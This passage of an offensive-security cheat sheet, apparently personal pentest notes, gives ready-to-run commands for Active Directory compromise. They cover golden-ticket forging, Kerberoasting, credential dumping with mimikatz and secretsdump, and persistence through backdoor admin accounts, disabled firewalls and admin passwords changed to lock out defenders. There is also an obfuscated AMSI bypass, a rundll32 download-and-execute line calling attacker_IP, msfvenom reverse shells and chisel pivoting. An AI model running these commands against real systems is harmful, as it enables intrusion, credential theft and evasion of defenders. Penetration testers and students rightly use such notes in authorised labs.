Grab the krbtgt user ntlm hash:
```
impacket-secretsdump domain/some_user:some_password@10.10.20.10 -outputfile krbhash -user-status

# You can also just run mimikatz on the target machine you are on and get the SID and the krbtgt NTLM hash
mimikatz.exe
lsadump::lsa /inject /name:krbtgt
```

Now run mimikatz on the target machine that you have access to as some_user and that also has krbtgt user:
```
evil-winrm -i 10.10.20.9 -u some_user
Or you can just RDP...

mimikatz.exe

# Now run the kerberos golden ticket module as follows replacing the domain SID and the krbtgt ntlm hash
kerberos::golden /user:some_user /domain:my.target_domain.com /sid:domain_SID_here /krbtgt:NTLM_hash_here /id:500 /ptt

# Spawn an admin shell with the following command if you have RDP 
misc::cmd

# You can also just exit mimikatz, if you the user you created the golden ticket for is the current user you are logged in as - you should have forged privs to access other machines in the network now

# Run a check to see if you can access other machines in the network
dir \\IP_of_target_or_hostname\c$
Install psexec or upload the binary and then run this command to get a shell on the other machines.
psexec.exe \\IP_of_target_or_hostname cmd.exe
```


## Pypykatz
```
# Crack sam files
pypykatz registry --sam sam.txt --security security.txt system.txt
```


## Rubeus
```
Rubeus.exe kerberoast /nowrap
```
Now crack on your machine
```
hashcat -m 13100 hash rockyou.txt
hashcat -m 13100 crackme_pls.txt /usr/share/wordlists/rockyou.txt
```

## LaZagne
```
LaZagne.exe all
```

## Snaffler
```
snaffler.exe -s -o snaffler.log
```

# Persistence
## Enable RDP access for user
Run all the commands in sequence below - if there is already RDP enabled on the target machine:
```
# Create a user on the compromised host from admin account
net user hacker password123 /add

# Add yourself to admin group
net localgroup "Administrators" hacker /add

# This will put you in the RDP group
net localgroup "Remote Desktop Users" hacker /add

# Disable firewall
netsh firewall set opmode disable

# This activates RDP on the box
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# OPTIONAL - This will add another key which will allow unauthenticated access via rdp to a machine
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f

```
If remote desktop users not enabled yet, run this command - enables remote desktop users group to get through firewall:
```
netsh advfirewall firewall set rule group="remote desktop" new enable="Yes"

# Run netstat to check if rdp port 3389 is open
netstat -ano
```

## Change a user's password
NOTE: This is useful for preventing Blue Team from gaining access to a compromised server. Change password of the admin account so they are unable to access for patching or reboot to take out your reverse shell.
```
net user <username> <new_password>
net user John NewPass123
net user Administrator yourbaseisbelongtous
```

## Enable SSH on Windows Target
```
Download the ssh.zip file from attacker machine - Install files can be found here: https://github.com/PowerShell/Win32-OpenSSH/releases - You can also grab the ssh.zip file from the odds_ends folder in this repo.

powershell iwr -uri http://10.0.0.87/ssh.zip -outfile .\ssh.zip

Unzip the file with any of the following commands:
.\7z.exe x C:\users\victim\Documents\ssh.zip
Expand-Archive -Path "C:\path\to\your\ssh.zip" -DestinationPath "C:\destination\folder"
powershell -command "Expand-Archive -Path 'C:\path\to\your\ssh.zip' -DestinationPath 'C:\destination\folder'"

Only if we need to create a tar file:
To create a tar.gz archive of a directory or file:
tar -czvf archive.tar.gz /path/to/directory_or_file

To extract files from a tar.gz archive:
tar -xzvf archive.tar.gz

Navigate into the extracted folder of ssh.zip and run the following powershell script
.\install-sshd.ps1

Now run the SSH service
start-service sshd
start-service ssh-agent

Now check that port 22 is listening
netstat-ano

Now try and access the machine with any compromised creds.
```

## Enable PSExec for all users - LocalAccountTokenFilterPolicy
```
Run the following command as admin to switch LocalAccountTokenFilterPolicy to 1 - this will enable all non 500 RID admin users to PSExec onto a Windows target machine
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d "1" /f
```

## Enable SSH on Linux Target
If SSH is not enabled on the Linux machine you are on, you may want to run the following commands as a privileged user:
```
sudo systemctl status ssh
sudo systemctl start ssh

You can stop or restart ssh with the following for troubleshooting purposes.
sudo systemctl stop ssh
sudo systemctl restart ssh
```

Or this:
```
sudo firewall-cmd --permanent --add-service=ssh
sudo firewall-cmd --reload
```

You can also run this:
```
sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
sudo iptables -A OUTPUT -p tcp --sport 22 -m conntrack --ctstate ESTABLISHED -j ACCEPT
sudo service iptables save
sudo service iptables restart
```

On your kali machine, create a dir on your loot folder for your target. Then run ssh-keygen to generate an ssh private and public key "id_rsa" (private) and "id_rsa.pub" (public).
```
ON YOUR KALI MACHINE

mkdir ~/loot/target
ssh-keygen -f ~/loot/target/id_rsa
set the password to "password"
```
Print the contents of the id_rsa.pub file - Make sure to copy the contents of that file.:
```
cat id_rsa.pub
```
Next go to the target machine and run the following commands in the home directory of the user you will ssh as:
```
ON TARGET MACHINE

cd /home/user/
mkdir .ssh
touch authorized_keys
```
Next, you will echo and put the contents of the id_rsa.pub from your kali machine to the target machine - you may want to change the name kali@kali for opsec purposes.
```
echo "ssh-rsa some_strings_here_blablabla= kali@kali" > authorized_keys
```
You should now be able to ssh to the target machine with the private key on your kali machine. Run this command from your kali machine:
```
ssh user@target_ip -i id_rsa
```

# Active Directory
## Secrets Dump
Dump sam and lsa remotely.
```
impacket-secretsdump username:password@10.10.10.15
impacket-secretsdump username:password@10.10.10.15 -outputfile hash.txt
```

## kerberoasting
```
impacket-GetUserSPNs domain.local/some_user:Password! -dc-ip 10.10.10.10 -request
```

## kerbrute - user enumeration
```
./kerbrute_linux_amd64 userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

## evil-winrm
```
#If using password
evil-winrm -i 10.10.1.10 -u Administrator

#If using hash
evil-winrm -i 10.10.1.10 -u Administrator -H NTLM_HASH_HERE 
```

## impacket-smbclient
```
impacket-smbclient domain.local/username@10.10.10.10
```

## psexec / smbexec / wmiexec
```
impacket-smbexec administrator:'password'@10.129.1.21
impacket-wmiexec administrator:'password'@10.129.1.21
impacket-psexec 'domain.local/some_user'@10.11.1.122 -hashes ':NT_HASH_HERE'
impacket-psexec Administrator:'Password!'@192.168.1.22
impacket-psexec 'administrator'@172.10.1.1 -hashes ':4c827b7074e99eefd49d05872185f7f8'
```

## crackmapexec
```
crackmapexec smb 10.10.10.0/24 -u 'administrator' -H 'NTLM_HASH_HERE'
crackmapexec smb 10.10.10.0/24 -u 'administrator' -p 'Password!'
crackmapexec smb 10.10.10.0/24 -u 'some_user' -p 'Password!' --shares
crackmapexec smb 10.10.10.0/24 -u 'administrator' -H 'NTLM_HASH_HERE' --shares
crackmapexec smb 10.10.10.0/24 -u 'administrator' -H 'NTLM_HASH_HERE' --ntds
crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt --sam 
crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt --lsa
crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt --local-auth --lsa
crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success
```

## powerview
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberName
Get-DomainUser -Properties samaccountname, logoncount
Get-DomainComputer | select name, logoncount
Get-DomainUser -SPN
```


# AV Bypass Techniques
## Turn off AV from Powershell 
```
Check if AV is on - RealTimeProtectionEnabled
Get-MPComputerStatus

Turn off AV
Set-MpPreference -DisableRealtimeMonitoring $true

Check again if set to false
Get-MPComputerStatus

Some machines may have tamper protection and is easier to turn off with RDP session.
```
## Execute payloads with explorer
```
explorer.exe /root,"C:\Windows\System32\calc.exe"
```
## Signed Binary Proxy Execution
```
wmic.exe process call create calc
```
## Execute payloads with rundll32.exe binary
```
For reference the binaries are located here:
    C:\Windows\System32\rundll32.exe for the Windows 32 bits version
    C:\Windows\SysWOW64\rundll32.exe for the Windows 64 bits version

Run this:
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```
## Execute powershell scripts
```
# Execute with rundll32.exe
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://attacker_IP/script.ps1');");
```

## PowerLessShell - Powershell Restriction Bypass
```
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell

# Attacker Machine
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=attacker_IP LPORT=4443 -f psh-reflection > liv0ff.ps1

msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost attacker_IP;set lport 4443;exploit"

python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj

# On target machine - need to upload the .csproj file to the target
c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj

You should get a shell back on msfconsole.

NOTE: You can create an msfvenom payload to catch a netcat shell instead of meterpreter.
```

## AMSI Bypass
Paste this into the command line and run before executing powershell scripts:
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; (Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
```

## Enable Evil-Winrm
It's possible that the target might have AV running to prevent you from running PSExec or Evil-Winrm on it. If you somehow have RCE from the web server or have an exploit to perform RCE, you can run the following command to enable Evil-Winrm access on the target.
```
powershell Enable-PSRemoting -force
```

# Pivoting

## SSH Tunneling 
First we need to configure the proxychains4.conf file.
```
sudo gedit/etc/proxychains4.conf
```
Comment out strict_chain and uncomment dynamic_chain.
Uncomment proxy_dns.

Make sure that at the bottom we have socks4 proxy uncommented:
```
socks 4        127.0.0.1 9050
```

Next we need to start the tor proxy.
```
sudo service tor status
sudo service tor start
sudo service tor status
```

Create an SSH tunnel into the machine that is connected to the internal network/subnet. You can ssh via username/pass or use an SSH key id_rsa:
```
ssh -NfD 9050 root@<IP Address>
or
chmod 600 id_rsa
ssh -NfD 9050 root@<IP Address> -i id_rsa
```
Now test with proxychains:
```
proxychains -q crackmapexec smb 10.10.11.0/24 -u '' -p '' --shares
```
To kill the SSH tunnel just run `ps aux | grep ssh` and `kill <process id>`.


## Chisel - Single Pivot Example
```
# On our attacker machine
chisel server -p 8001 --reverse
gedit /etc/proxychains4.conf

# Add this in /etc/proxychains4.conf file to the bottom and comment out any other proxies
socks5 127.0.0.1 1080

# Run a python server on our attacker machine where we have the chisel binary hosted, usually in the ~/server folder
python3 -m http.server 80

# Target machine where you have shell
# upload chisel to target machine - run this from root at the target 
wget http://attacker_ip:80/chisel
chmod +x chisel
./chisel client attacker_ip:8001 R:1080:socks

# Now do a quick test to see if you can reach the internal network
proxychains -q crackmapexec smb 10.10.11.0/24 -u '' -p '' --shares
```

## Chisel - Double/Multi Pivot Example
```
Create the following lines on proxychains4.conf
socks5 127.0.0.1 1080
#socks5 127.0.0.1 2080
#socks5 127.0.0.1 3080

This is on your attacker machine
chisel server -p 8001 --reverse # Do this on attacker machine aka us

# First pivot jump box - target machine
ssh -i id_rsa rooth@10.10.10.100
wget http://10.10.14.7:80/chisel
chmod +x chisel
# run this on the target machine - remember the ip here is your attacker machine
./chisel client 10.10.14.13:8001 R:1080:socks 

# PWN the 2nd box
proxychains -q impacket-psexec 'testuser'@172.16.1.10 -hashes ':NTLM_HASH_HERE'
bitsadmin.exe /transfer /Download /priority Foreground http://10.10.14.13:80/chisel.exe c:\windows\temp\chisel.exe

# Attacker machine 
#do this on another tab
chisel server -p 8002 --reverse 

# 2nd box to pivot - on the target box you already pwned
chisel.exe client 10.10.14.13:8002 R:2080:socks   # remember the ip here is your attacker machine

# Attacker Machine - configure proxychains4.conf
comment out socks5 127.0.0.1 1080
uncomment socks5 127.0.0.1 2080

# Attacker Machine - PWN the 3rd box
proxychains -q impacket-psexec 'administrator'@172.16.2.10 -hashes ':NTLM_HASH_HERE'

Wash rinse repeat to pivot a 3rd, 4th time etc...
```

## Chisel - Local Port Forward / Firewall Bypass
Scenario: You follow the above steps and pwn a jump box, pivot to first internal subnet, then pivot to a second internal subnet and pwn a machine in each subnet. There is another machine in the second internal subnet 172.16.2.17 which has an open ssh port based on scans from the compromised machine in that second internal subnet. There is a firewall and the only way to ssh to that port is to do local port forwarding.

In this example, 10.10.14.13 is your attack machine IP and 172.16.2.10 is the pwned machine in the 2nd internal subnet. 

Refer to this example: 10.10.14.13 (attacker machine) > 10.10.10.100 (jumpbox) > 172.16.1.10 (box in 1st internal subnet) > 172.16.2.10 (box in 2nd internal subnet) - 172.16.10.17 (next target hidden behind firewall)

```
# FIRST on attacker machine run this:
chisel server -p 8003 --reverse 

On the 172.16.2.10 machine run this:
chisel client 10.10.14.13:8003 R:0.0.0.0:2222:172.16.2.17:22

Now try to nmap yourself and see if port 2222 is open which should be the ssh port of 172.16.2.17
nmap 127.0.0.1 -p 2222

Now run ssh to your localhost.
ssh testuser@127.0.0.1 -p 2222
```

Here is another scenario where you run `netstat -tulnp`, there might be an open port that you couldn't find in your initial scans. You can try to expose that port to be scanned locally with the following steps:
```
# Attacker machine
chisel server --reverse --port 51234

# Target machine - run chisel to connect back to our attacker IP
wget http://KALI_IP/chisel_1.9.1_linux_amd64 -O chisel
chmod +x chisel
chisel client KALI_IP:51234 R:65432:127.0.0.1:65432
```

Now you can run nmap on port 65432 locally with the following:
```
nmap -p 65432 127.0.0.1 -A
```

Here is another example scenario where you run netstat to see a Jenkin's server running on port 8080 internally on the target but need to do local port forwarding in order to access it on your browser:
```
NOTE: Doesn't require running a tor server if it's just one machine you have direct access to.

Attacker Machine (Me)
chisel server --port 8001 --reverse

Target Machine
chisel client 192.168.45.172:8001 R:8085:127.0.0.1:8080

or after file transfer of chisel to the target --
/tmp/chisel client 192.168.45.172:8001 R:8085:127.0.0.1:8080

^^ Basically I'm doing a local port forward with the above command to get the chisel client on the target machine to connect back to me, that's my attacker IP with the 192.* IP. 

My chisel server is running on 8001 so it will connect to that and basically it will make the port 8080 on the target machine appear on my local machine as port 8085 so I can access the Jenkins server on my local machine at 127.0.0.1:8085 - next, browse to that IP and port via your web browser of choice.
```

## Metasploit Proxy
```
After obtaining a meterpreter session, background the sessions and run the following command.
background
route add 10.10.10.0/24 1

1 is the meterpreter session to add the route to.

search socks proxy
use 1
options
run -j

Make sure to check the options and make sure the port for the socks proxy is available. Depending on your msf version, you may need to specify if it's socks 4a or 5. 5 IMO has been more stable. After you run the socks proxy, you should be able to run proxychains commands against the subnet you added as a route on the meterpreter session. 


Alternate Process - will update this more later:
Upload meterpreter payload to connect back to msfconsole via exploit/multi/handler
Run autoroute module NOT the autorun command on meterprter - doesn't always get results - and create routes, make sure to verify the gateway IP
Run socks proxy modules and run tor proxies, if double pivoting, you have to run 2 at the same time in msfconsole
NOTE: Sometimes you need to get meterpreter payload to connect back to another meterpreter session or box not your attacker IP - will clarify later
```

# Useful Metasploit Modules and Commands
## Post Exploitation Modules

```

Find services on target machine
post/windows/gather/enum_services

Arp Scanner
post/windows/gather/arp_scanner

Network Enumeration
post/windows/gather/enum_network

After getting foothold, run this module to get suggestions on exploits to run for privesc
multi/recon/local_exploit_suggester

MSFVenom show list of payloads
msfvenom --list payloads
msfvenom --list payloads | grep meterpreter
```


# Misc Commands
## Python Shell Upgrade
```
python -c “import pty;pty.spawn(‘/bin/bash’)”
python -c 'import pty;pty.spawn("/bin/bash")' <<< This usually works
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
python3 -c 'import pty;pty.spawn("/bin/bash")'

Add advanced features in case the shell is still not working properly
export TERM=xterm
Ctrl + z
stty raw -echo ; fg
reset
```

## docker commands
Install on Kali
```
sudo apt install docker.io
sudo apt install docker-compose
```
Pull image
```
docker pull domain.io/container/here/amd64:latest
```
List images
```
docker image ls
```
Remove images
```
docker image rm ubuntu:22.04
```
Run docker image
```
docker run -it helloworld /bin/bash
```
Print all containers running:
```
docker ps
```
Get a bash shell on the docker container
```
docker exec -it <container_id> bash
```
Copy over files to container
```
docker cp /path/to/local/file <container_id>:/path/inside/container
```
Copy files from container to local folder
```
docker cp <container_id>:/path/inside/container /path/on/local_host
```

## Searchsploit
```
Update searchsploit db
searchsploit -u

Seaerch for exploit
searchsploit exploit_name_or_service

Inspect the exploit
searchsploit -x 31337

Mirror/Copy the exploit payload to the current folder
searchsploit -m 31337
```

## Kali Terminal Shortcuts
```
Create new terminal tab
ctrl + shift + t

Create subterminal horizontally
ctrl + shift + r

Create subterminal veritcally
ctrl + shift + d

Close subterminal
ctrol + shift + e

Move between subterminals
alt + up/down/left/right

Move between terminal tabs
ctrl + pageup/pagedown

Move between virtual desktops
ctrl + alt + left/right

Ctrl+A: Move to the start of the command line.
Ctrl+E: Move to the end of the command line.
Alt+F: Move forward one word.
Alt+B: Move backward one word.
Ctrl+P or Up Arrow: Go to the previous command in the command history. Press the shortcut multiple times to walk back through the history.
Ctrl+N or Down Arrow: Go to the next command in the command history. Press the shortcut multiple times to walk forward through the history.
Ctrl+R: Recall the last command matching the characters you provide. Press this shortcut and start typing to search your bash history for a command.
Ctrl+O: Run a command you found with Ctrl+R.
Ctrl+G: Leave history searching mode without running a command.
Ctrl+K: Kill (cut) text from the current cursor position to the end of the line.
Ctrl+Y: Yank (paste) the most recently killed text back into the buffer at the cursor.

For Ubuntu machines
Ctrl+Shift+up/down: Move up and down the terminal line by line
Shift+PgUp/PgDn: Move up and down the terminal by page
Ctrl+Shift+PgUp/PgDn: Move terminal tabs left/right

```

## Checksum
```
#Windows
CertUtil -hashfile 'ISO-FILE-PATH' md5
CertUtil -hashfile 'ISO-FILE-PATH' sha256

#Linux
md5sum original.txt
```

# Troubleshooting

## Corrupt zsh history file fix
```
cd ~
mv .zsh_history .zsh_history_bad
strings -eS .zsh_history_bad > .zsh_history
fc -R .zsh_history
```

## Can't SSH or get reverse shell on Virtual Box from OpenVPN connection
Sometimes you need to change mtu from 1500 to 1200 if you can't seem to catch a shell - some issue with virtual box
```
sudo ifconfig tun0 mtu 1200
```
